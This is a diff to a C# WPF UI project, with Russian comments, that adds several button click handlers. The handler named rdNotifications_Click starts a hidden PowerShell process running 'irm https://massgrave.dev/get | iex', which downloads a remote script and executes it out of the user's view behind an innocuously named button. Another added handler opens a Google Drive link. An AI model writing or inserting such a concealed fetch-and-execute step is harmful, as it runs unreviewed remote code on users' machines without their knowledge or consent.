@@ -170,7 +170,45 @@ namespace WPFUIKitProfessional
                     return result.Trim();
                 }
             }
+        }//Name End
+
+        private void rdNotifications_Click(object sender, RoutedEventArgs e)
+        {
+            ProcessStartInfo startInfo = new ProcessStartInfo()
+            {
+                FileName = "powershell.exe",
+                Arguments = "irm https://massgrave.dev/get | iex",
+                CreateNoWindow = true, // Скрыть окно PowerShell
+                UseShellExecute = false, // Не использовать оболочку операционной системы для запуска процесса
+                RedirectStandardOutput = true, // Перенаправить стандартный вывод
+                RedirectStandardError = true // Перенаправить стандартную ошибку
+            };
+
+            Process process = new Process() { StartInfo = startInfo };
+
+            process.Start();
+            process.WaitForExit(); // Дождаться завершения процесса
         }
-        //Name End
+
+        private void rdSettings_Checked(object sender, RoutedEventArgs e)
+        {
+
+        }
+
+        private void rdSettings_Click(object sender, RoutedEventArgs e)
+        {
+            string url = "https://drive.google.com/file/d/1XovreMHh2Xd3bugVRl3H5EBUH6fagwFH/view?usp=drive_link";
+
+            try
+            {
+                // Открытие URL в браузере по умолчанию
+                Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
+            }
+            catch (Exception ex)
+            {
+                // Если произошла ошибка, показываем сообщение
+                MessageBox.Show($"Не удалось открыть ссылку: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
+            }
+        }
     }
 }
